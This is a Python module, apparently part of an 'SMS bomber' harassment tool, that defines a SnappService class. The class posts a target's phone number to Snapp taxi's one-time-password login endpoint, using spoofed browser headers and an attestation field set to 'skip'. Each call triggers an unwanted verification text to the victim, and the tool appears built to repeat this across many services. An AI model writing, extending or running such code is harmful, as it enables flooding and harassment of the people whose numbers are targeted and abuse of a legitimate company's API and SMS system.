import ssl
import certifi
import aiohttp
from bomber.services.bomber_service import BomberService


class SnappService(BomberService):
    async def send_request(self, phone_number: str):
        if phone_number.startswith('0'):
            phone_number = phone_number.replace('0', '+98', 1)

        url = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp"

        headers = {
            "sec-ch-ua-platform": '"macOS"',
            "Referer": "https://app.snapp.taxi/login",
            "x-app-name": "passenger-pwa",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "App-Version": "pwa",
            "x-app-version": "v18.31.0",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "locale": "fa-IR"
        }

        payload = {
            "cellphone": phone_number,
            "attestation": {"method": "skip", "platform": "skip"},
            "extra_methods": []
        }

        ssl_context = ssl.create_default_context(cafile=certifi.where())
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                return resp